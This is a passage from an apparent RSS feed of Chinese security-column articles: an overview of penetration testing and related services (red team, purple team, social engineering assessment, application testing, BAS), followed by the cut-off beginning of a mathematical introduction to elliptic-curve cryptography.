&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a5a4e982a6317ebdbf46b897b90a1218_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;近些年来，“渗透测试”似乎是目前行业中对攻防类服务需求响应最多的概念。大量企业声称自己需要渗透测试，安全服务供应商也声称自己能够提供渗透测试，双方一拍即合，很多“渗透测试”服务项目应运而生。然而这些“渗透测试”服务真的行之有效么？这些“渗透测试”需求也是合情合理么？&lt;/p&gt;&lt;p&gt;答案是否定的，其原因可能在于对“渗透测试”这一概念产生了理解偏差，导致很大一部分项目都在用模糊的目标和模糊的需求进行以商务关系为基础的合作。&lt;/p&gt;&lt;p&gt;在本文中，我们将剖析“渗透测试”概念并盘点相关的方案和工具，旨在帮助读者明确攻防类服务需求，正确选择服务方案或工具，少走弯路。&lt;/p&gt;&lt;h2&gt;渗透测试不是“银弹”&lt;/h2&gt;&lt;p&gt;首先需要明确渗透测试的概念。这里引用CREST标准中对于“渗透测试”概念的描述：渗透测试是一种道德的攻击模拟，旨在通过实际利用特定场景中的漏洞来验证控制措施的有效性。即渗透测试的最终目标从来就不是发现应用中的漏洞，而是发现控制措施或防御手段中的“漏洞”。基于这个认识，我们平时进行的手工发现漏洞的工作，其实都称不上是标准的“渗透测试”。&lt;/p&gt;&lt;p&gt;真正标准的“渗透测试”方案应当具备以下特点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;目标通常为选定的应用或设备。如果目标设定为一个网络，应该至少是应用和设备的集合；&lt;/li&gt;&lt;li&gt;测试对象不仅涵盖技术控制手段，也包括管理控制手段；&lt;/li&gt;&lt;li&gt;所有发现的漏洞都要通过真实利用来证明其实际存在，进而证明控制措施及防御手段失效。&lt;/li&gt;&lt;/ol&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2efa00074d1233c105f23c92d2497a0a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;910&quot; data-rawheight=&quot;427&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;910&quot; data-original=&quot;https://pic3.zhimg.com/v2-2efa00074d1233c105f23c92d2497a0a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2efa00074d1233c105f23c92d2497a0a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;910&quot; data-rawheight=&quot;427&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;910&quot; data-original=&quot;https://pic3.zhimg.com/v2-2efa00074d1233c105f23c92d2497a0a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2efa00074d1233c105f23c92d2497a0a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;但是与此同时，渗透测试的短板和限制也凸显出来：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;目标只能是选定的应用或设备，对于未知资产和过程无能为力；&lt;/li&gt;&lt;li&gt;针对人员要素的审查充满了运气和局限性（社会工程学）；&lt;/li&gt;&lt;li&gt;理论上无法发现所有问题，甚至无法发现可能存在的问题；&lt;/li&gt;&lt;li&gt;真实利用漏洞存在风险；&lt;/li&gt;&lt;li&gt;渗透测试的实施人员必须是专家型人员。因此没有足够的专家人员能够代替扫描器发现所有常规安全漏洞——即便能够解决，成本也是极不合理的；&lt;/li&gt;&lt;li&gt;测试结果只是某一个时间点的“快照”，会随着时间推移和资产迭代逐渐失去参考价值；&lt;/li&gt;&lt;li&gt;提供的结果相对技术性，需要放在业务环境中进一步解释；&lt;/li&gt;&lt;li&gt;多数时候只能“摸黑”猜测实际的防御手段，在进行建议时会与真实的防守人员产生诸多信息不对称。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所以实际标准定义下的“渗透测试”是如此的干涩、生硬，以致让人难以下咽，而现在大家普遍提供和接受的都是为了改善上述缺陷，不断演进产生的“变体”，后面本文会一一为大家盘点。&lt;/p&gt;&lt;p&gt;&lt;b&gt;1. 高仿真黑客——“红队”&lt;/b&gt;&lt;/p&gt;&lt;p&gt; “红队”一词在互联网中可考的来源是1992年一部名为Sneakers的电影，大致的含义是一支授权的、高度仿真黑客行为的攻击队伍。“红队”与“渗透测试”最大的差异就是目标不确定，即“红队”的评估范围是整个网络以及所有相关资产。“红队”的实施方法和组织形式相比渗透测试而言会更加松散，甚至更加接近实际的黑客——“红队”的行为方式除了不窃取数据、不破坏系统以外，必须和真正的黑客保持高度一致，甚至包含选拔和培养方式以及价值观的宣贯。&lt;/p&gt;&lt;p&gt;因此“红队”适合企业在具备并落实了安全基本面（基础安全设备、补丁和脆弱性管理、安全制度、人员配备、基本意识等）的前提下，磨炼整体安全防控能力时引入。否则，请先建设安全基本面。如果在基本面建设高度不完全的情况下强行引入“红队”，除了以高昂的成本证明自己的网络不堪一击外意义不大。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f231b6c87c0260982bc5bbda2a9f74e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1280&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1280&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f231b6c87c0260982bc5bbda2a9f74e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f231b6c87c0260982bc5bbda2a9f74e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1280&quot; data-rawheight=&quot;720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1280&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f231b6c87c0260982bc5bbda2a9f74e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6f231b6c87c0260982bc5bbda2a9f74e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;2. 高度协作的防御专家——“紫队”&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在常见红蓝对抗场景中，这样情况经常发生：“红队”选用外部人员，“蓝队”选用内部运维人员。“红队”在某个时间点攻破了“蓝队”人员防守的据点，可能由于防御和检测机制失效，“红队”并不知道据点曾经设置防御手段，“蓝队”人员在事后分析时才发现防御和检测手段在攻击前已经失效，但此时距离“案发时间”已经很久。&lt;/p&gt;&lt;p&gt;这类典型的红蓝对抗通常会存在下列问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;“蓝队”人员的应变防御能力没有得到锻炼。&lt;/li&gt;&lt;li&gt;“红队”由于采用了外部人员，红蓝队之间存在SLA层面的对抗关系。“蓝队”并不会主动告知“红队”防守细节，“红队”自然也无法对“蓝队”的防守细节做切实可行的建议。同时“红队”在复盘时也会尽可能隐藏自己的攻击细节，以便攻击手段可多次复用。&lt;/li&gt;&lt;li&gt;“案发时间”过去已久，难以进行确切复盘。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;大家不难发现，协作程度成为了多数红蓝对抗无法达成预期效果的关键因素。由于这个原因，一套基于高度协作的“紫队”（红+蓝=紫）方案应运而生。“紫队”与标准红蓝队之间最重要的区别就是，其攻击和防御方法都是预先确定的。同时紫队模式是协作而迭代进行的，即在“蓝队”一次防守失败后，“红队”可以通过重放攻击行为让“蓝队”尝试改变策略再次尝试防守，直至“蓝队”具备快速决策及处置该问题的能力。此时“红蓝对抗”中的“对抗性”消失，输赢已经变得不再重要了。“紫队”方案的难点在于如何编制一个能够覆盖大多数攻击场景的攻防预案，以及如何掌控红蓝双方的对抗/协作平衡点。但是“紫队”方案不应完全替代“红蓝对抗”，因为“对抗性”具备无法替代的实战价值，因此“紫队”方案作为“红蓝对抗”的补充方案或二次方案将更具成效。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 人员要素审查——社会工程评估&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f5f69c2fbd232497b9bfdd243ed95b87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;635&quot; data-rawheight=&quot;393&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;635&quot; data-original=&quot;https://pic4.zhimg.com/v2-f5f69c2fbd232497b9bfdd243ed95b87_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f5f69c2fbd232497b9bfdd243ed95b87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;635&quot; data-rawheight=&quot;393&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;635&quot; data-original=&quot;https://pic4.zhimg.com/v2-f5f69c2fbd232497b9bfdd243ed95b87_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f5f69c2fbd232497b9bfdd243ed95b87_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;一言以蔽之，社会工程评估是围绕“人”这个维度进行的专项评估。一次全面的社会工程评估应当涵盖和“人”纵向相关的所有内容——包括关键岗位的安全背景调查、安全管理制度审查、安全意识评估等。以安全意识评估为例，评估应首先针对岗位和工作内容构建人员风险决策模型，需要评估包括对风险本质的认识程度、对风险的关注程度、预知风险的能力、对风险准确识别的能力、面对风险的决策能力、快速并正确消除风险的能力、提前布局和防范的动机和意识、风险获取的渠道等各方面因素。通过问卷以及基本社会工程手段（鱼叉、水坑、诱导等基本社工场景）对人员风险决策模型进行赋值，从而全面系统地了解被评估对象的社会工程属性。&lt;/p&gt;&lt;p&gt;目前国内业界能够进行整体社会工程评估的咨询公司有限，多数都以反钓鱼行为管控（APBM）为主（邮件钓鱼+意识培训）。然而即便如此，APBM的实际作用远比想象中的大太多。在针对人员要素的审查层面，专项的社会工程评估会比包含在渗透测试内的社会工程测试更具备优势。&lt;/p&gt;&lt;p&gt;&lt;b&gt;4. 上线与合规——应用安全测试&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0ec859ed709e2f4d56d4ae99a077400e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1000&quot; data-rawheight=&quot;500&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1000&quot; data-original=&quot;https://pic3.zhimg.com/v2-0ec859ed709e2f4d56d4ae99a077400e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0ec859ed709e2f4d56d4ae99a077400e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1000&quot; data-rawheight=&quot;500&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1000&quot; data-original=&quot;https://pic3.zhimg.com/v2-0ec859ed709e2f4d56d4ae99a077400e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-0ec859ed709e2f4d56d4ae99a077400e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;准确的说，应用安全测试属于风险评估的一部分。我们目前能够提供以及正在接受的“渗透测试”多数都属于这个类型。&lt;/p&gt;&lt;p&gt;应用安全测试与渗透测试的最大区别如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;评估对象为“风险”，即有被利用可能的漏洞也需要指出来。多数情况证明漏洞存在即可，不需要实际利用（不需要而非不能）。&lt;/li&gt;&lt;li&gt;需要尽可能发现并覆盖常规安全漏洞，因此需要覆盖基本测试项并结合扫描器完成。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;应用安全测试是渗透测试本地化以及持续演进的产物，用于补充自动化漏洞扫描在应用层漏洞发现能力的不足，相较于渗透测试，对个人技术要求门槛较低，但对于实施方法以及基本测试项积累等供应商层面的能力要求反而较高。当前现状是业内富有经验的渗透测试专家有限，攻防类以及技术评估类需求日益旺盛，因此对监管合规以及安全基本面建设更为友好，且人才资源相对充裕的应用安全测试逐渐占据了市场主导。此外最重要的是，应用安全测试的收费标准远远低于渗透测试（标准版渗透测试大致的费用为$315每小时）。&lt;/p&gt;&lt;p&gt;如果企业需要进行大量的上线测试以及合规测试，并且以发现漏洞为目标的话，应用安全测试是目前的不二之选。但随着安全评估自动化和智能化水平不断提高，介于渗透测试及自动化扫描之间的应用安全测试将逐渐被取代。&lt;/p&gt;&lt;p&gt;&lt;b&gt;5. 持续渗透仿真——违规与攻击模拟（BAS）&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93240d32463b0820fc91fea80ac913b5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1380&quot; data-rawheight=&quot;555&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1380&quot; data-original=&quot;https://pic2.zhimg.com/v2-93240d32463b0820fc91fea80ac913b5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93240d32463b0820fc91fea80ac913b5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1380&quot; data-rawheight=&quot;555&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1380&quot; data-original=&quot;https://pic2.zhimg.com/v2-93240d32463b0820fc91fea80ac913b5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-93240d32463b0820fc91fea80ac913b5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;违规与攻击模拟（BAS）是Gartner从2017年开始重点推广的热门技术之一，然而由于各类因素影响，该项技术在国内的推广效果一般。&lt;/p&gt;&lt;p&gt;作为“渗透测试”的头号替代品，BAS最大的优势是解决了手工渗透测试无法持续进行的短板——BAS可以通过编排模拟各类攻击和违规行为，并设置时间计划让这些攻击能够持续进行。和漏洞扫描器不同的是，BAS不仅可以自动化扫描漏洞，还可以模拟一些非法访问甚至投放钓鱼网站。但是由于BAS可仿真模拟的技术内容太过庞杂，市场中提供的各类BAS解决方案差异很大并且各有侧重。然而无论哪种解决方案，BAS期望解决的问题和渗透测试是相同的——希望找出防御和控制手段中的缺陷，因此BAS的推广与应用同样存在安全基本面的问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;小结&lt;/b&gt;&lt;/p&gt;&lt;p&gt;综上，在“渗透测试”及其“周边”方案中，其实依然没有一样是能够一劳永逸解决一切问题的灵丹妙药——现在不存在，以后也不会存在。&lt;/p&gt;&lt;p&gt;“安全是一个持续改进的过程”，这句话适用于这个行业中最具代表性的技术评估方案，也同样适用于所有工作。我们只有在不断演进并完善这些经典方案的同时，寻找创新的替代方案，方能适配日益开放的网络环境和复杂多变的业务需求。&lt;/p&gt;&lt;hr/&gt;&lt;p&gt;本文首发于《2019长亭年度漏洞威胁分析与2020安全展望》。报告从“漏洞”和“攻防演练”两个维度解构攻防，抽样来自金融、互联网、通信、能源、医疗、教育、传媒等多个行业的223家企业/机构，透过数字背后的逻辑，尝试梳理安全从业人员的操作方法论，将漏洞关注优先级和修复的经验复制成能力象限，帮助从业人员的部分能力碎片找平水位。&lt;/p&gt;&lt;p&gt;                                            扫码阅读报告，解锁安全新姿势&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;260&quot; data-rawheight=&quot;260&quot; class=&quot;content_image&quot; width=&quot;260&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;260&quot; data-rawheight=&quot;260&quot; class=&quot;content_image lazy&quot; width=&quot;260&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f3c1689f2c28ce846cd469d65a0d505e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2020-03-04-110819359</guid>
<pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>ECC相关算法解析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2020-02-05-103665076.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103665076&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-836b76d7336dd4773fa26f12a252efdd_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;前言 &lt;/h2&gt;&lt;p&gt;近日NSA向微软公布了一个基于ECC加密的漏洞(CVE-2020-0601)，该漏洞出现于Windows CryptoAPI(Crypt32.dll)做签名验证的部分，该漏洞可能导致严重的威胁。我对此十分好奇，于是学习了ECC相关的知识，在这里和大家分享一下。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;ECC原理介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先我们来学习一下ECC(椭圆曲线加密)的原理。ECC全称为“Ellipse Curve Ctyptography”，是一种基于椭圆曲线数学的公开密钥加密算法。椭圆曲线在密码学中的使用是在1985年由Neal Koblitz和Victor Miller分别独立提出的。与传统的基于大质数分解难题的加密算法不同，该加密方式基于 “&lt;b&gt;离散对数&lt;/b&gt;” 这种数学难题。该算法的主要优势是可以使用更小的密钥病提供相当高等级的安全。ECC164位的密钥产生一个安全级，相当于RSA 1024位密钥提供的保密强度，而且计算量较小，处理速度更快，存储空间和传输带宽占用较少。目前我国居民二代身份证正在使用 256 位的椭圆曲线密码，虚拟货币比特币也选择ECC作为加密算法。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;一、数学基础&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;以下内容我们小学二年级就学过，带领大家复习一下&lt;/blockquote&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-237a786b91d53bd1ce9e86559caad35c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;364&quot; class=&quot;content_image&quot; width=&quot;400&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-237a786b91d53bd1ce9e86559caad35c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;364&quot; class=&quot;content_image lazy&quot; width=&quot;400&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-237a786b91d53bd1ce9e86559caad35c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;首先我们来介绍一下&lt;b&gt;射影&lt;/b&gt;。传统的几何几何系统中，我们可以在《几何原本》中照到如下定理：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;由任意一点到任意一点可作直线。&lt;/li&gt;&lt;li&gt;一条有限线段可以无限延长&lt;/li&gt;&lt;li&gt;凡直角皆相等&lt;/li&gt;&lt;li&gt;三角形内角和为180度&lt;/li&gt;&lt;li&gt;同一平面内一条直线a和另外两条直线b.c相交，若在a某一侧的两个内角的和小于两直角，则b.c两直线经无限延长后在该侧相交&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b7661474115d211f3773840bc6792a90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;677&quot; data-rawheight=&quot;449&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;677&quot; data-original=&quot;https://pic1.zhimg.com/v2-b7661474115d211f3773840bc6792a90_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b7661474115d211f3773840bc6792a90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;677&quot; data-rawheight=&quot;449&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;677&quot; data-original=&quot;https://pic1.zhimg.com/v2-b7661474115d211f3773840bc6792a90_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-b7661474115d211f3773840bc6792a90_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;以上内容属于欧式几何，然后又一些大佬觉得欧几里得说的不对，他们觉得第五条定理不能作为公理，而且三角形的内角和也不是180度。所以，有些强者就建立了新的几何体系，比如，俄国的罗巴切夫斯基提出“至少可以找到两条相异的直线，且都通过P点，并不与直线R相交”代替第五公设，然后与欧氏几何的四个公设结合成一个公理系统，简称“罗氏几何(双曲几何)”。黎曼大佬也插了一脚，他觉得“找不到一条直线可以通过P点，并且不与直线R相交”，于是建立了黎曼几何(椭圆几何).数学就是这样神奇，只要你能自圆其说，满足自洽性，你也能建立自己的体系。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-491efabee3c81a637a20cd77fa35f220_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;101&quot; class=&quot;content_image&quot; width=&quot;400&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-491efabee3c81a637a20cd77fa35f220_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;400&quot; data-rawheight=&quot;101&quot; class=&quot;content_image lazy&quot; width=&quot;400&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-491efabee3c81a637a20cd77fa35f220_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们把上面的两种几何体系称之为非欧几何。定义平行线相交于无穷远点P∞，使平面上所有直线都统一为有唯一的交点，那么：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;一条直线只有一个无穷远点；一对平行线有公共的无穷远点&lt;/li&gt;&lt;li&gt;任何两条直线有不同的无穷远点&lt;/li&gt;&lt;li&gt;平面上的无穷远点构成的集合组成一条无穷远直线&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;&lt;b&gt;射影平面&lt;/b&gt;可被认为是个具有额外的“&lt;b&gt;无穷远点&lt;/b&gt;”之一般平面，平行线会于该点相交。因此，在射影平面上的两条线会相交于一个且仅一个点。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;（一）椭圆曲线&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;椭圆曲线&lt;/b&gt;就是在射影平面上满足魏尔斯特拉斯方程(Weierstrass)的点构成曲线。对于有限域上的椭圆曲线，一般我们用如下方程定义：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c130a730c465dc4dc6e558dc7fc3d4d5_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;154&quot; data-rawheight=&quot;34&quot; class=&quot;content_image&quot; width=&quot;154&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c130a730c465dc4dc6e558dc7fc3d4d5_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;154&quot; data-rawheight=&quot;34&quot; class=&quot;content_image lazy&quot; width=&quot;154&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c130a730c465dc4dc6e558dc7fc3d4d5_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;其图像一般如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51cd8a743fbbfcaf1216b692327fbf9a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;360&quot; data-rawheight=&quot;195&quot; class=&quot;content_image&quot; width=&quot;360&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51cd8a743fbbfcaf1216b692327fbf9a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;360&quot; data-rawheight=&quot;195&quot; class=&quot;content_image lazy&quot; width=&quot;360&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-51cd8a743fbbfcaf1216b692327fbf9a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;椭圆曲线的定义也要求曲线是非奇异的(即处处可导的)。几何上来说，这意味着图像里面没有尖 点、自相交或孤立点。代数上来说，这成立当且仅当判别式: &lt;br/&gt; &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5870451c5fac936a0b0ee861c07e9701_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;194&quot; data-rawheight=&quot;34&quot; class=&quot;content_image&quot; width=&quot;194&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5870451c5fac936a0b0ee861c07e9701_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;194&quot; data-rawheight=&quot;34&quot; class=&quot;content_image lazy&quot; width=&quot;194&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-5870451c5fac936a0b0ee861c07e9701_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;不为0.这里主要是满足其可导性。&lt;/p&gt;&lt;p&gt;&lt;b&gt;（二）近世代数&lt;/b&gt;&lt;/p&gt;&lt;p&gt;群&lt;/p&gt;&lt;p&gt;群（group）是由一种集合以及一个二元运算所组成的，并且符合“群公理”。群公理包含下述四个性质的代数结构。这四个性质是：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;封闭性：对于所有G中a, b，运算a·b的结果也在G中。&lt;/li&gt;&lt;li&gt;结合律：对于所有G中的a, b和c，等式 `(a·b)·c = a·(b·c)`成立。&lt;/li&gt;&lt;li&gt;单位元：存在G中的一个元素e，使得对于所有G中的元素a，总有等式`e·a = a·e = a`成立。&lt;/li&gt;&lt;li&gt;对于集合中所有元素存在逆元素&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;特殊的群：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;    满足交换律的群称为&lt;b&gt;交换群&lt;/b&gt;（阿贝尔群），不满足交换律的群称为非交换群（非阿贝尔群）。&lt;/p&gt;&lt;p&gt;    设 (G, · )为一个群，若存在一G内的元素g，使得&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-02ad22bec46f50e9928ef922a2f1bcd7_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;211&quot; data-rawheight=&quot;32&quot; class=&quot;content_image&quot; width=&quot;211&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-02ad22bec46f50e9928ef922a2f1bcd7_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;211&quot; data-rawheight=&quot;32&quot; class=&quot;content_image lazy&quot; width=&quot;211&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-02ad22bec46f50e9928ef922a2f1bcd7_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;则称G关于运算“ · ”形成一个&lt;b&gt;循环群&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;元素的&lt;b&gt;阶&lt;/b&gt;(order)：&lt;/p&gt;&lt;p&gt;一个群内的一个元素a之阶（有时称为周期）是指会使得am = e的最小正整数m（其中的e为这个群的单位元素，且am为a的m次幂）。若没有此数存在，则称a有无限阶。有限群的所有元素有有限阶。&lt;/p&gt;&lt;p&gt;一个群G的阶被标记为ord(G)或|G|,他表示群内元素的个数，而一个元素的阶则标记为ord(a)或|a|。&lt;/p&gt;&lt;p&gt;&lt;b&gt;有限域&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&amp;amp;emsp;&amp;amp;emsp;在数学中，有限域（finite field）或伽罗瓦域（Galois field，为纪念埃瓦里斯特·伽罗瓦命名）是包含有限个元素的域。与其他域一样，有限域是进行加减乘除运算都有定义并且满足特定规则的集合。有限域最常见的例子是当 p 为素数时，整数对 p 取模。有限域的元素个数称为它的阶(order)。可以看出域是满足更多运算的群。&lt;/p&gt;&lt;p&gt;这里我们规定一个有限域Fp&lt;/p&gt;&lt;ul&gt;&lt;li&gt;取大质数p，则有限域中有p-1个有限元：0，1，2...p-1&lt;/li&gt;&lt;li&gt;Fp上的加法为模p加法`a+b≡c(mod p)`&lt;/li&gt;&lt;li&gt;Fp上的乘法为模p乘法`a×b≡c(mod p)`&lt;/li&gt;&lt;li&gt;Fp上的除法就是乘除数的乘法逆元`a÷b≡c(mod p)`，即 `a×b^(-1)≡c (mod 